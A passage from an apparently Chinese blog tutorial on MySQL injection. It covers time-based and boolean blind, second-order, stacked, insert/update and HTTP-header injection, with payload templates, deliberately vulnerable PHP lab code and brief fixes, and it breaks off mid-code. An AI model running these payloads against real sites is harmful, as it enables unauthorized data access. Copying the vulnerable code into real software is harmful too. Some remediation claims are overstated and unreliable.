延长N秒</span><br><span class="line">sleep有效的条件：</span><br><span class="line">使用sleep的sql语句的查询结果不为空</span><br><span class="line"></span><br><span class="line">需要注意的几个点：</span><br><span class="line">程序运行时间由sql语句的条件（where）来定</span><br><span class="line">select sleep(N),column_name from table_name</span><br><span class="line">每查询出一条数据延迟相对应的N秒,但出现的数据并不是说过了每条数据的延时时间就会出现，而是过了   全部数据所需要sleep时间总和后，才会出现所有的数据</span><br><span class="line"></span><br><span class="line">select sleep(N),column_name from table_name where …………</span><br><span class="line">上面这条sql语句的执行时间会根据where限制后出现的数据来定（数据量-&gt;程序执行时间）</span><br><span class="line"></span><br><span class="line">MySQL sleep过多的影响及解决方法:</span><br><span class="line">影响：</span><br><span class="line">严重消耗mysql服务器资源(主要是cpu, 内存)，并可能导致mysql崩溃。</span><br><span class="line">解决方法:</span><br><span class="line">SHOW GLOBAL VARIABLES LIKE &apos;wait_timeout&apos;;</span><br><span class="line">SHOW GLOBAL VARIABLES LIKE &apos;interactive_timeout&apos;;</span><br><span class="line">SET GLOBAL wait_timeout=30;</span><br><span class="line">SET GLOBAL interactive_timeout=30;</span><br><span class="line">wait_timeout, 即可设置睡眠连接超时秒数，如果某个连接超时，会被mysql自然终止</span><br><span class="line">wait_timeout=30 #即设置mysql连接睡眠时间为100秒，任何sleep连接睡眠时间若超过100秒，将会被mysql服务自然终止</span><br><span class="line"></span><br><span class="line">if(条件,执行1,执行2)</span><br><span class="line">与大多编程语言中的if函数相似，执行判断功能</span><br><span class="line">条件：</span><br><span class="line">返回值为bool类型</span><br><span class="line">执行1：</span><br><span class="line">条件参数返回值为 True</span><br><span class="line">执行2：</span><br><span class="line">条件参数返回值为 False</span><br><span class="line">常用于与sleep的搭配：</span><br><span class="line">if(条件,sleep(N),1)</span><br><span class="line">如果条件成立,程序延时N秒（出现延时就代表存在注入点，且可利用这一点获取数据库信息）</span><br><span class="line">如：if(1&lt;2,sleep(1),sleep(2)) 条件为True 程序延时1秒</span><br><span class="line"></span><br><span class="line">substr()</span><br><span class="line">substr()两种表示法：</span><br><span class="line">substr(string,num_start,num_length);</span><br><span class="line">string为字符串</span><br><span class="line">start为字符起始位置(起始位置为1)</span><br><span class="line">length为截取字符长度</span><br><span class="line">substr(String from N for M)</span><br><span class="line">String为字符串</span><br><span class="line">from 对应上面的num_start 字符起始位置</span><br><span class="line">for 对应上面的 num_length 截断长度</span><br><span class="line">使用substr()对字符串进行操作:</span><br><span class="line">select substr(&apos;hello&apos;,2) -&gt; ello</span><br><span class="line">select substr(&apos;hello&apos; from 2) -&gt; ello</span><br><span class="line">如果忽略最后一个参数（截断长度）自动选取从开始位置到最后的字符串</span><br><span class="line">select substr(&apos;hello&apos;,2,3) -&gt; ell</span><br><span class="line">select substr(&apos;hello&apos; from 2 for 3) -&gt; ell</span><br><span class="line">这就是比较正常的使用方法（我没说上面的不正常啊）</span><br><span class="line">ascii()</span><br><span class="line">ascii()的作用为返回相应字符的ASCII编码，如果输入字符串或一串数字则会按第一个字符来进行返回相应的ASCII编码</span><br><span class="line">select ascii(1) -&gt; 49</span><br><span class="line">select ascii(&apos;a&apos;) -&gt; 97</span><br><span class="line">一个单独的ascii()函数确实没什么大意思，但与上面的stbstr()、if(),sleep()来套组合拳，那就很厉害了</span><br><span class="line">ascii(substr(String,Num_Start,1))</span><br><span class="line">利用substr来截取字符串的每一个字符来传递给ascii，ascii()函数呢再最终输出该字符的ascii编码</span><br><span class="line">if(ascii(substr(String,Num_Start,1))=Num,sleep(N),1)</span><br><span class="line">利用if来将ascii()函数返回的ascii编码进行判断（猜测）,如果猜测数据正好等于返回的ascii编码,那么 程序就进行延时N秒。</span><br><span class="line">利用sleep()这个特性呢，就可以进行fuzz测试获取真实数据以达到注入目的</span><br><span class="line">length()</span><br><span class="line">length(String) 返回字符串长度</span><br><span class="line">如：select length(database()); 返回当前数据库名长度</span><br><span class="line">与ascii()函数一样，不打组合拳没什么威力</span><br><span class="line">if(length(String)=Num,条件1,条件2)</span><br><span class="line">在进行substr获取数据库、表、字段名之前，如果知道他们各自的字符串长度，在进行爆破名的过程中效率会   高跟多</span><br></pre></td></tr></table></figure><h4 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#获取当前数据库名长度</span><br><span class="line">and if(length(database())=Num,sleep(3),1)</span><br><span class="line">#获取所有数据库名长度</span><br><span class="line">and if(length((select group_concat(schema_name) from information_schema.schemata))=Num,sleep(3),1)</span><br><span class="line">#获取当前数据库名</span><br><span class="line">and if(ascii(substr(database(),N,1)=Num,sleep(3),1) N的大小由数据库名长度决定,Num的范围是 1~127 汉字除外</span><br><span class="line"></span><br><span class="line">上面已经说了具体获取数据库库名和长度的方法，表、字段等相关信息不再复述</span><br></pre></td></tr></table></figure><h3 id="Bool注入"><a href="#Bool注入" class="headerlink" title="Bool注入"></a>Bool注入</h3><h4 id="什么是Bool注入"><a href="#什么是Bool注入" class="headerlink" title="什么是Bool注入"></a>什么是Bool注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构造特定的sql语句</span><br><span class="line">当条件成立时网页返回正常（and 1=1）</span><br><span class="line">当条件不成立时网页出现错误（and 1=2）</span><br><span class="line"></span><br><span class="line">Bool注入使用的环境</span><br><span class="line">1、正常注入流程无法使网页回显有效数据库信息</span><br><span class="line">2、当构造的sql语句条件不成立时会返回与正常页面不同的信息（不成立的依据）</span><br></pre></td></tr></table></figure><p>后端代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    error_reporting(<span class="number">0</span>); <span class="comment">//程序不报错</span></span><br><span class="line"></span><br><span class="line">    $con = mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'****'</span>,<span class="string">'test'</span>);</span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from admin where id =$id limit 1"</span>;</span><br><span class="line"></span><br><span class="line">    $res = mysqli_query($con,$sql);</span><br><span class="line"></span><br><span class="line">    $row = mysqli_fetch_array($res);</span><br><span class="line"></span><br><span class="line"><span class="comment">#重点</span></span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line">    <span class="keyword">if</span>($row)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $row[<span class="string">'username'</span>]; <span class="comment">//条件正确，网页返回正常数据</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error"</span>; <span class="comment">//条件错误，网页返回error</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="涉及到的sql函数及利用"><a href="#涉及到的sql函数及利用" class="headerlink" title="涉及到的sql函数及利用"></a>涉及到的sql函数及利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">与延时注入相似，大多是将延时注入里面中的sleep()替换为1，与之相对的替换为0</span><br><span class="line">为什么替换为1、0：</span><br><span class="line">1在编程语言代表True</span><br><span class="line">0在变成序言中代表False</span><br><span class="line">常用到的函数：</span><br><span class="line">if()、ascii()、length()、substr()</span><br><span class="line">上述函数已经在延时注入里面介绍过了，这里不再造车轮</span><br><span class="line"></span><br><span class="line">利用Bool注入获取数据库信息：</span><br><span class="line">注入环境：</span><br><span class="line">and 1=1 返回正常</span><br><span class="line">and 1=2 返回错误</span><br><span class="line">获取当前数据库名长度：</span><br><span class="line">and 1=if(length(database())=Num,1,0)</span><br><span class="line">遍历Num 当条件成立时页面返回正常</span><br><span class="line">获取当前数据库名：</span><br><span class="line">and 1=if(ascii(substr(database(),Num,1))=Num2,1,0)</span><br><span class="line">Num:截取database()第几个字符</span><br><span class="line">遍历Num2获取该字符的ascii编码进行解码即可</span><br><span class="line"></span><br><span class="line">剩下的表长度、表名、字段长度、字段名、字段信息都是通过这种方法获取的，方法，原理都是一样。不再复述</span><br></pre></td></tr></table></figure><p><strong>简单的防注入：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    $con = mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'****'</span>,<span class="string">'test'</span>);</span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">   $id = mysqli_escape_string($id);<span class="comment">//防注入</span></span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from admin where id ='$id' limit 1"</span>; <span class="comment">//注意这里进行了单引号闭合,这两点一起才能防注入</span></span><br><span class="line"></span><br><span class="line">    $res = mysqli_query($con,$sql);</span><br><span class="line"></span><br><span class="line">    $row = mysqli_fetch_array($res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $row[<span class="string">'username'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">    这种简单的防注入不仅仅是应用在Bool注入，延时注入，二次注入，联合注入等注入攻击基本上都可以防御</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span></span><br></pre></td></tr></table></figure><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="什么是二次注入"><a href="#什么是二次注入" class="headerlink" title="什么是二次注入"></a>什么是二次注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击者构造的恶意数据存储到数据库中，导致每次特定操作可引发恶意代码的执行。</span><br><span class="line">上述两个过程即为二次注入</span><br><span class="line">1、将恶意数据（代码）插入到数据库中</span><br><span class="line">2、攻击者特定行为使恶意代码从服务器中执行</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/注入\mysql\二次注入\1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h4 id="二次注入的利用"><a href="#二次注入的利用" class="headerlink" title="二次注入的利用"></a>二次注入的利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">二次注入不像上面的延时注入、Bool注入、联合注入花样那么多，而且二次注入根据不同的环境也会存在不同的注入方法。</span><br><span class="line"></span><br><span class="line">在这里就以实战的形式来进行表达(sqllab 24题)</span><br></pre></td></tr></table></figure><p><strong>登陆界面</strong>：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/注入/mysql/二次注入/login.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>后端代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line"></span><br><span class="line">username password 都用了mysql_real_escape_string函数将敏感字符进行过滤，所以登录界面不存在什么注入</span><br></pre></td></tr></table></figure><h5 id="PHP-mysql-real-escape-string-函数防SQL注入"><a href="#PHP-mysql-real-escape-string-函数防SQL注入" class="headerlink" title="PHP mysql_real_escape_string() 函数防SQL注入"></a><a href="https://www.cnblogs.com/jukan/p/5348398.html" target="_blank" rel="noopener">PHP mysql_real_escape_string() 函数防SQL注入</a></h5><p>注册用户功能：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/注入/mysql/二次注入/reg.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>后端代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $username=  mysql_escape_string($_POST[<span class="string">'username'</span>]);  <span class="comment">//将敏感字符过滤</span></span><br><span class="line">    $pass= mysql_escape_string($_POST[<span class="string">'password'</span>]);  <span class="comment">//将敏感字符过滤</span></span><br><span class="line">    $re_pass= mysql_escape_string($_POST[<span class="string">'re_password'</span>]);  <span class="comment">//将敏感字符过滤</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;font size='3' color='#FFFF00'&gt;"</span>;</span><br><span class="line">    $sql = <span class="string">"select count(*) from users where username='$username'"</span>;</span><br><span class="line">    $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">    $row = mysql_fetch_row($res);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//print_r($row);</span></span><br><span class="line">    <span class="keyword">if</span> (!$row[<span class="number">0</span>]== <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        &lt;script&gt;alert(<span class="string">"The username Already exists, Please choose a different username "</span>)&lt;/script&gt;;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        header(<span class="string">'refresh:1, url=new_user.php'</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($pass==$re_pass)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment"># Building up the query........</span></span><br><span class="line">                </span><br><span class="line">                $sql = <span class="string">"insert into users ( username, password) values(\"$username\", \"$pass\")"</span>;</span><br><span class="line">                mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Error Creating your user account,  : '</span>.mysql_error());</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">              ··················</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构造</span><br><span class="line">Username: admin&apos;# 从后端源码可以看出 需要进行单引号闭合</span><br><span class="line">password = admin</span><br></pre></td></tr></table></figure><p>登录后进行密码修改</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/注入/mysql/二次注入/upd.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>无论当前密码是什么，都可以修改成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/注入/mysql/二次注入/succ.png" alt="image-20191105204537626" title>                </div>                <div class="image-caption">image-20191105204537626</div>            </figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">能修改成功的原因：</span><br><span class="line">username：admin&apos;#</span><br><span class="line">在进行修改密码的过程中用到了下面的sql语句：</span><br><span class="line">$sql = update table_name set password=new_password where username=admin&apos;# and curr_password=*</span><br><span class="line">可以看到 # 将后面password的验证注释掉了。所以无论原密码是什么,都可以成功将密码修改</span><br></pre></td></tr></table></figure><h5 id="一道关于二次注入的CTF"><a href="#一道关于二次注入的CTF" class="headerlink" title="一道关于二次注入的CTF"></a><a href="https://blog.csdn.net/qq_30123355/article/details/58161312" target="_blank" rel="noopener">一道关于二次注入的CTF</a></h5><h5 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">暂且能想到的办法是对用户输入的特殊字符进行过滤</span><br></pre></td></tr></table></figure><h5 id="搁置的问题"><a href="#搁置的问题" class="headerlink" title="搁置的问题"></a><strong>搁置的问题</strong></h5><ul><li>二次注入没有实现的代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//输入数据代码（insert）</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    name &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    passwd &lt;input type=<span class="string">"password"</span> name=<span class="string">"passwd"</span>&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">'submit'</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">"****"</span>,<span class="string">'testt'</span>);</span><br><span class="line">mysql_select_db(<span class="string">'testt'</span>,$con);</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line">$name = mysql_escape_string($name);</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line">$passwd = mysql_escape_string($passwd);</span><br><span class="line"><span class="comment">// $name = mysql_real_escape_string($name);</span></span><br><span class="line"><span class="comment">// $sql = "insert into test(id,user,passwd) values(NULL,\"$name\",\"$passwd\");";</span></span><br><span class="line"><span class="comment">// $res = mysql_query($sql,$con);</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"insert into test ( user, passwd) values(\"$name\", \"$passwd\")"</span>;</span><br><span class="line">mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Error Creating your user account,  : '</span>.mysql_error());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//更新数据代码 不知道哪出了问题，没有办法实现二次注入</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    name &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line"> oldpasswd &lt;input type=<span class="string">"password"</span> name=<span class="string">"odpass"</span>&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    passwd &lt;input type=<span class="string">"password"</span> name=<span class="string">"passwd"</span>&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">'submit'</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">"****"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'testt'</span>,$con);</span><br><span class="line"></span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line">$passwd = mysql_real_escape_string($passwd);</span><br><span class="line">$odpass = $_POST[<span class="string">'odpass'</span>];</span><br><span class="line">$odpass = mysql_real_escape_string($odpass);</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"UPDATE test SET passwd='$passwd' where user='$name' and passwd='$odpass'; "</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">$row = mysql_affected_rows();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="什么是堆叠注入"><a href="#什么是堆叠注入" class="headerlink" title="什么是堆叠注入"></a><strong>什么是堆叠注入</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">平常我们注入时都是通过对原来sql语句传输数据的地方进行相关修改，注入情况会因为该语句本身的情况而受到相关限制。但堆叠注入的一条sql语句中存在多条功能不同的sql语句，其中每条不同功能的sql语句以 ; 结束。在特定情况下可以依次执行拼接好的sql语句。这样就突破了仅能对数据进行操作的限制，堆叠注入可以进行sql中所有的操作</span><br></pre></td></tr></table></figure><h4 id="堆叠注入使用的条件"><a href="#堆叠注入使用的条件" class="headerlink" title="堆叠注入使用的条件"></a><strong>堆叠注入使用的条件</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行。</span><br></pre></td></tr></table></figure><p>后端代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'****'</span>,<span class="string">'testt'</span>);</span><br><span class="line"></span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from test where id=$id;"</span>;</span><br><span class="line"></span><br><span class="line">mysqli_multi_query($con,$sql); <span class="comment">//支持执行多条sql语句</span></span><br><span class="line"></span><br><span class="line">$res = mysqli_store_result($con); <span class="comment">//上一条sql语句执行结果储存在 mysqli_store_result（）。结果空返回NULL</span></span><br><span class="line"></span><br><span class="line">$row = mysqli_fetch_array($res);<span class="comment">//返回形式类似于python中的字典只不过php有自己的数组输出方式</span></span><br><span class="line"></span><br><span class="line">var_dump($row);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string"> 正常情况下，程序是不会回显第一条sql语句分号后面的内容，但分号后面的sql语句会在数据库中正常执行</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> 修复堆叠注入很简单，在其他条件不会触发sql注入的情况下将mysqli_multi_query() 替换为 mysqli_query()</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br></pre></td></tr></table></figure><h3 id="Insert、update注入"><a href="#Insert、update注入" class="headerlink" title="Insert、update注入"></a><strong>Insert、update注入</strong></h3><h4 id="什么是Insert、update注入"><a href="#什么是Insert、update注入" class="headerlink" title="什么是Insert、update注入"></a><strong>什么是Insert、update注入</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在数据库中处理或更新字段信息时会用到其中的insert（插入新字段数据）、update（更新字段数据）函数来对数据进行修改。</span><br><span class="line">因为对数据库进行交互，后端代码没有进行严格的过滤或存在其他安全问题。当新的字段数据可控时，可能会导致sql注入等系列安全问题</span><br></pre></td></tr></table></figure><h4 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'******'</span>,<span class="string">'testt'</span>);</span><br><span class="line"></span><br><span class="line">@$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line">@$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"insert into test values(NULL,'$name','$passwd')"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#'''上面是insert注入'''</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"update test set passwd='$passwd' where user='$name'"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#'''这里是update注入'''</span></span><br><span class="line"></span><br><span class="line">mysqli_query($con,$sql);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#如果后端代码对可控信息参数进行引号闭合，可以用下面转义的方法进行防御</span></span><br><span class="line">@$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">$name = addslashes($name);</span><br><span class="line">@$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$passwd = addslashes($passwd);</span><br><span class="line"><span class="comment">#如果后端代码没有对可控信息参数进行引号闭合，可采用特殊字符过滤的方法进行防御</span></span><br></pre></td></tr></table></figure><h4 id="留下的问题"><a href="#留下的问题" class="headerlink" title="留下的问题"></a>留下的问题</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">为什么上面的程序可以用and sleep(3) or&apos; 进行注入</span><br><span class="line">下面header头注入却要用 or sleep(3) or&apos; 来进行注入</span><br></pre></td></tr></table></figure><h4 id="解决上面出现的问题"><a href="#解决上面出现的问题" class="headerlink" title="解决上面出现的问题"></a>解决上面出现的问题</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在解决问题之前，先了解一下 and、or 执行原理及mysql中处理字符串的原理</span><br><span class="line">and：</span><br><span class="line">当 and 前的条件为True时，and后面的（sql函数或sql语句）才执行</span><br><span class="line">select 1 and sleep(2) #执行（ 1 代表True，&gt;1 完全成立）</span><br><span class="line">select 0 and sleep(2) #不执行（ 0 代表False）</span><br><span class="line"></span><br><span class="line">or：</span><br><span class="line">当 or 前面的条件为False时，or 后面的（sql函数或sql语句）才执行</span><br><span class="line">select 0 or sleep(2) # 执行</span><br><span class="line">select 1 or sleep(2) # 不执行</span><br><span class="line"></span><br><span class="line">在mysql中当字符串与数字进行比较时，如果字符串中的第一个字符是0-9任意数字，则在比较过程中会用第一个数字与其 进行比较，如果第一个字符是非整型则默认为0</span><br><span class="line">select &quot;1a&quot;=1; =&gt; 1</span><br><span class="line">select &quot;a&quot;=a; =&gt; 0</span><br><span class="line"></span><br><span class="line">#insert、update后端与数据库交互的部分代码</span><br><span class="line">$sql = &quot;insert into test values(NULL,&apos;$name&apos;,&apos;$passwd&apos;)&quot;;</span><br><span class="line">当 $name 被传入的值为 123 时 可用 and 来进行触发延时注入（123&gt;1 = True）</span><br><span class="line">当 $name 被传入的值为 &quot;asd&quot; 时 可用 or 来进行触发延时注入(&quot;asd&quot;= 0 =False)</span><br><span class="line">所以这就很好解释HTTP头注入大多用 or 而不用 and</span><br><span class="line">HTTP头获取的数据大多为字符型数据且第一个字符为非整型数据，所以要用or不用and。</span><br><span class="line">如果host 存放的数据为 1.1.1.1 那 就要用 and 来触发 延时注入</span><br></pre></td></tr></table></figure><h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><h4 id="什么是HTTP-头注入"><a href="#什么是HTTP-头注入" class="headerlink" title="什么是HTTP{头注入"></a>什么是HTTP{头注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先来看一段正常的请求包</span><br><span class="line"></span><br><span class="line">GET /test.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: values=admin</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">上面全部的都为请求包的Head部分，因为User-Agent（反爬虫）、Host（不明白的东西不能说）、Cookie（判断用户）这三个头所包含的数据存在特殊用处，所以有些网站会将他们及其对应的数据内容存放到数据库中，如果后端代码没有处理完善，进而导致sql注入</span><br><span class="line"></span><br><span class="line">因为Head头注入里面牵扯到的原理是一样的，所以我就用同一个后端代码来进行概括了</span><br></pre></td></tr></table></figure><h4 id="后端代码-1"><a href="#后端代码-1" class="headerlink" title="后端代码"></a>后端代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'******'</span>,<span class="string">'testt'</span>);</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"values"</span>,<span class="string">"admin"</span>); 